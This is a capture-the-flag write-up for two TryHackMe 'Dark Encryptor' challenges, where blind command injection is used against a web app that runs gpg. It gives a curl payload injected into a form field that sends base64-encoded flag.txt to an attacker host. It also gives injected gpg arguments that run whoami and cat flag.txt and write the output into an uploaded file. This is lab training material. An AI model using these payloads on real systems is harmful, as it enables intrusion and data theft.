---
date: March 19, 2025
description: Blind Command injection in gpg
platform: TryHackMe
categories: Web
tags:
---
#command-injection/linux #blind #pgp #linux

# Dark Encryptor 1 
Void managed to hack into DarkMatter's internal network. I don't think they use it much, but we found this encryption tool hosted on a server. Let's see if we can find anything interesting lying around. Start the machine below and access the web app at http://10.10.6.24:5000.


request to create encrypted messege
```http
POST / HTTP/1.1
Host: 10.10.6.24:5000
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

text_input=test&recipient=NullPhantom
```

## Solution 

> blind os command injection

the webapp is 'probably' using `gpg` to encrypt our message tried generic blind remote call using curl and worked
```bash
curl -X POST http://10.10.6.24:5000/ -d 'text_input=test;curl+http://10.x.x.x:4444/`base64+flag.txt`&recipient=NullPhantom
```

![](_attachments/Pasted%20image%2020250318045607.png)



# Dark Encryptor 2 
After pivoting through their internal network, we have found yet another encryption tool. Can you hack into the server and extract the secret data? Our intel tells us that the app is using the gpg tool.

Start the machine below and access the web app at http://10.10.126.222:5000/.

> request is a multiform part data of filename and recipient is accepted
> response saving the output as a random filename uploaded in `/upload`
## Solution 
> blind os command injection

The web application was running gpg tool playing around with it locally looks like it is running this ocmmand

```bash
gpg --armor --encrypt --recipient "ByteReaper" message.txt # then saves it to a random file
```


Tried injecting the message and input but wouldnt work, so tried injecting the recipient. tried `;curl` technique like in part 1 but nothing comes to my reciever. Tried just gpg injecting parameters to exfiltrate data and it worked!  

```bash
gpg --armor --encrypt --recipient "ByteReaper" --armor --comment `whoami` -o uploads/whoami.gpg message.txt;
```

This results to running the whoami command and passess in the comment of the encrypted gpg file. similar to image comments command injection.

`--armor` - create ascii output 
`--comment` adds comment top of encrypted gpg 
`-o` saves output to file

ByteReaper --armor --comment `cat flag.txt|base64` -o uploads/flag.gpg

![](_attachments/Pasted%20image%2020250323055048.png)

![](_attachments/Pasted%20image%2020250323055057.png)


Visit the file `/uploads/flag.gpg`

```
-----BEGIN PGP MESSAGE-----
Comment: VEhNe2dvaW5nX2luX2JsMW5kXzIzOTR9Cg==

hQEMA1JxpTs2EtRdAQf/Y39O5JeMVfYqD+fi6d/MJOXz8oY/W8Ft2y2D9t+Sa2Jv
fFyEzriUeCUXEVkrSePsr03UXeKLW2igzSUFWTs18HWY0z79u6mnyAjKBk2DEWVA
MTtUYOTARwu5p8SgXEcULvI12lF/87i09m/877A4QjkRtfNDrJ73RLGB1TC52kBi
lj7Hct2d6tq1UXhf2vsbUWFwUKQHn7gtnmnV38rbbGAz5wEOq08vT23CZptrTriD
Y+etv4B9KOUPNkorU8r86b5acYRSpEbZvURiCTFBKWte0B7HrDDZDVGUOMXDkge/
wm7C27nnO7DHxh88DvRlB0sSgCgLlCLvUlC9Fa1XLNRYAQkCEMIHe8iQVt+zqs7W
yhOJrQayZ//+YRWTutrIep+gxaB22PXzVV5DycsxiHlKVYe0QRE7qknNzSnEKGIi
oWlUxkviRndptQbOCr7yiaoPJIyrbpLVmA==
=OQIT
-----END PGP MESSAGE-----

```